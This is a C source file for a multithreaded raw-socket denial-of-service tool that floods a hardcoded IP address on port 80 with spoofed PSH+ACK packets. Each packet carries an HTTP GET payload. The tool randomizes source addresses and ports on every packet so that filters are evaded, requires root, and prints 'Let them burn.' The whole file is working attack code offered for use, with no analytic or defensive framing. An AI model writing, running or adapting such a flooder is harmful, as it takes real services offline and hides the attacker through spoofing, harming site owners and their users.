// Filename: hammer_raw.c
// Compiler: gcc -std=c23 -O3 -pthread -o hammer_raw hammer_raw.c
// EXECUTION: MUST BE RUN AS ROOT! -> sudo ./hammer_raw
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <threads.h>
#include <stdbool.h>
#include <signal.h>
#include <time.h>

#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <errno.h>

#define TARGET_IP "50.7.24.50"
#define TARGET_PORT 80
#define NUM_THREADS 4

#define PAYLOAD "GET / HTTP/1.1\r\nHost: " TARGET_IP "\r\n\r\n"

static volatile bool running = true;

// Pseudo-header for checksum calculation
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

// Checksum calculation function
unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while(nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if(nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    
    return(answer);
}

void signal_handler(int signum) {
    running = false;
}

int worker_function(void* arg) {
    char datagram[4096];
    char source_ip[32];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0) {
        // No printf, just exit. If it fails, it fails.
        return thrd_error;
    }

    sin.sin_family = AF_INET;
    sin.sin_port = htons(TARGET_PORT);
    sin.sin_addr.s_addr = inet_addr(TARGET_IP);

    memset(datagram, 0, 4096);

    // IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(PAYLOAD);
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0; // Set to 0 before calculating checksum
    iph->saddr = inet_addr("192.168.1.100"); // Spoofed source IP
    iph->daddr = sin.sin_addr.s_addr;

    // TCP Header
    tcph->source = htons(12345);
    tcph->dest = htons(TARGET_PORT);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin=0;
    tcph->syn=0;
    tcph->rst=0;
    tcph->psh=1; // PSH+ACK flood
    tcph->ack=1;
    tcph->urg=0;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    // IP checksum
    iph->check = csum((unsigned short *)datagram, iph->tot_len);

    // Set the IP_HDRINCL option. This tells the kernel that the IP header is already included.
    int one = 1;
    const int *val = &one;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));
    
    // Copy payload
    char *payload_ptr = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
    strcpy(payload_ptr, PAYLOAD);

    while(running) {
        // Randomize source IP and port for each packet to bypass simple filters
        sprintf(source_ip, "10.%d.%d.%d", rand() % 255, rand() % 255, rand() % 255);
        iph->saddr = inet_addr(source_ip);
        tcph->source = htons(rand() % 65535);
        tcph->seq = rand();
        
        // Recalculate checksums
        iph->check = 0;
        iph->check = csum((unsigned short *)datagram, iph->tot_len);

        tcph->check = 0;
        psh.source_address = iph->saddr;
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(PAYLOAD));
        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(PAYLOAD);
        char* pseudogram = malloc(psize);
        memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + strlen(PAYLOAD));
        
        tcph->check = csum((unsigned short*)pseudogram, psize);
        free(pseudogram);
        
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    }
    close(s);
    return thrd_success;
}

int main() {
    if(getuid() != 0) {
        printf("FATAL: Root privileges are required for raw socket access. Re-run with sudo.\n");
        return 1;
    }
    printf("RAW SOCKET OVERRIDE ENGAGED. Bypassing TCP stack. Let them burn.\n");
    
    srand(time(NULL));
    signal(SIGINT, signal_handler);
    signal(SIGPIPE, SIG_IGN);

    thrd_t threads[NUM_THREADS];
    for (int i = 0; i < NUM_THREADS; ++i) {
        thrd_create(&threads[i], worker_function, NULL);
    }
    for (int i = 0; i < NUM_THREADS; ++i) {
        thrd_join(threads[i], NULL);
    }
    return 0;
}
